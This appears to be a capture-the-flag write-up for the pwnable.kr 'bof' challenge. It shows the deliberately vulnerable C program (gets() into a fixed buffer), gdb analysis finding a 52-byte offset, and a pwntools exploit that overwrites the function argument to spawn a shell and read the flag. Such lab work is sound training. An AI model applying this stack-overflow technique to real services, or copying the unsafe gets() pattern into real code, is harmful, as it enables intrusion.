<h1>bof</h1>
This looks like a regular buffer overflow problem

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

We need key to be 0xcafebabe to get a shell.
disassembling with gdb yields

```
gdb-peda$ disas func
Dump of assembler code for function func:
   0x5655562c <+0>:	push   ebp
   0x5655562d <+1>:	mov    ebp,esp
   0x5655562f <+3>:	sub    esp,0x48
   0x56555632 <+6>:	mov    eax,gs:0x14
   0x56555638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:	xor    eax,eax
   0x5655563d <+17>:	mov    DWORD PTR [esp],0x5655578c
   0x56555644 <+24>:	call   0xf7e5dca0 <_IO_puts>
   0x56555649 <+29>:	lea    eax,[ebp-0x2c]
   0x5655564c <+32>:	mov    DWORD PTR [esp],eax
   0x5655564f <+35>:	call   0xf7e5d3e0 <_IO_gets>
   0x56555654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:	jne    0x5655566b <func+63>
   0x5655565d <+49>:	mov    DWORD PTR [esp],0x5655579b
   0x56555664 <+56>:	call   0xf7e38da0 <__libc_system>
   0x56555669 <+61>:	jmp    0x56555677 <func+75>
   0x5655566b <+63>:	mov    DWORD PTR [esp],0x565557a3
   0x56555672 <+70>:	call   0xf7e5dca0 <_IO_puts>
   0x56555677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:	je     0x56555688 <func+92>
   0x56555683 <+87>:	call   0xf7ef5680 <__stack_chk_fail>
   0x56555688 <+92>:	leave  
=> 0x56555689 <+93>:	ret    
End of assembler dump.
gdb-peda$ b *0x56555654
Breakpoint 3 at 0x56555654
```

This breakpoint allows us to see how much memory we need to overwrite. I input 6 e's and look through the stack.

```
gdb-peda$ x/30x $esp
0xffffd590:	0xffffd5ac	0xffffd634	0xf7fb0000	0x00004f17
0xffffd5a0:	0xffffffff	0x0000002f	0xf7e0adc8	0x65656565
0xffffd5b0:	0x56006565	0xf7fb0000	0x00000001	0x5655549d
0xffffd5c0:	0x00000001	0x00000003	0x56556ff4	0xc7964500
0xffffd5d0:	0xf7fb0000	0xf7fb0000	0xffffd5f8	0x5655569f
0xffffd5e0:	0xdeadbeef	0x56555250	0x565556b9	0x00000000
0xffffd5f0:	0xf7fb0000	0xf7fb0000	0x00000000	0xf7e16637
0xffffd600:	0x00000001	0xffffd694
```

We can see 0x65656565 (eeee) is 52 bytes from 0xdeadbeef. This means we need to overwrite 52 bytes.
I wrote a quick exploit using pwntools.

```
from pwn import *;
r = remote("pwnable.kr", 9000)
r.sendline(b'a'*52+p32(0xcafebabe))
r.interactive()
```

```
(ctf) [huck@knuth] python exploit.py          
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls
bof
bof.c
flag
log
log2
super.pl
$ cat flag
daddy, I just pwned a buFFer :)
```
